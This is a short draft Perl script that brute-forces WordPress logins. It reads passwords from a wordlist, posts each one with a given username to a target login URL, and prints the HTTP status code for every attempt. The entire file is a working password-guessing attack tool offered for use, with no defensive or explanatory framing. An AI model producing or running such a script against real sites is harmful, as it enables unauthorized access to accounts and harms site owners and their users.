#!/usr/bin/env perl

# draft code

use 5.018;
use strict;
use warnings;
use LWP::UserAgent;

sub main {
    my $target   = $ARGV[0];
    my $username = $ARGV[1];
    my $wordlist = $ARGV[2];

    if (($target) && ($username) && ($wordlist)) { 
        my $userAgent = LWP::UserAgent -> new();

        open (my $file, "<", $wordlist);

        while (<$file>) {
            chomp ($_);

             my $request = $userAgent -> post($target,
                {
                    "log" => $username,
                    "pwd" => $_,
                    "wp-submit" => 'Log in'
                }
            );

	        my $httpCode  = $request -> code();

            print "[-] $_ -> tested | $httpCode \n";
        }

        close ($file);
    }
}

main();
exit;